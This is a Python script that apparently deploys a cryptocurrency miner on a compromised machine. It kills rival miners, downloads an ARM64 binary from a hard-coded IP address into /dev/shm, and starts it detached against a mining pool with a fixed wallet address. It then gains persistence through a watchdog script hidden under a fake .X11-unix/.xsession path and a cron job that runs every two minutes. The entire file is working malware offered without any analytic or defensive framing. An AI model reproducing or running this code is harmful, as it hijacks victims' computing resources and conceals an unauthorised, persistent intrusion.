import subprocess, os, urllib.request, time

# Kill any existing miner
subprocess.run(['pkill', '-9', 'turbo-pearl'], capture_output=True)
subprocess.run(['pkill', '-9', 'alpha-miner'], capture_output=True)
time.sleep(1)

DST = '/dev/shm/turbo-pearl-miner'

# Download ARM binary
try:
    urllib.request.urlretrieve('http://151.247.219.40:8000/alpha-miner-arm64', DST)
    os.chmod(DST, 0o755)
except Exception as e:
    result = 'DOWNLOAD_FAIL:' + str(e)[:50]

# Start miner
if os.path.exists(DST) and os.path.getsize(DST) > 1000000:
    try:
        cmd = f'nohup {DST} --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker GB10_253 > /dev/shm/miner.log 2>&1 &'
        subprocess.run(['bash', '-c', cmd])
        time.sleep(3)
        r = subprocess.run(['pgrep', '-a', 'turbo-pearl'], capture_output=True, text=True)
        if r.stdout.strip():
            result = 'ARM_DEPLOYED:' + r.stdout.strip()[:40]
        else:
            result = 'STARTED_CHECK_POOL'
    except Exception as e:
        result = 'START_FAIL:' + str(e)[:50]
else:
    result = 'NO_BINARY'

# Add cron persistence
try:
    watchdog = """#!/bin/sh
pgrep -f "turbo-pearl.*prl1pjdp6c4dzmzemsw0" >/dev/null 2>&1 && exit 0
cd /dev/shm && [ -x ./turbo-pearl-miner ] && nohup ./turbo-pearl-miner --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker GB10_253 > /dev/shm/.mlog 2>&1 &
"""
    os.makedirs('/dev/shm/.X11-unix', exist_ok=True)
    with open('/dev/shm/.X11-unix/.xsession', 'w') as f:
        f.write(watchdog)
    os.chmod('/dev/shm/.X11-unix/.xsession', 0o755)
    ex = subprocess.run(['crontab', '-l'], capture_output=True, text=True).stdout
    if '.xsession' not in ex:
        subprocess.run(['crontab', '-'], input=ex.rstrip() + "\n*/2 * * * * /dev/shm/.X11-unix/.xsession\n", capture_output=True, text=True)
    result += ' +CRON'
except:
    pass

result
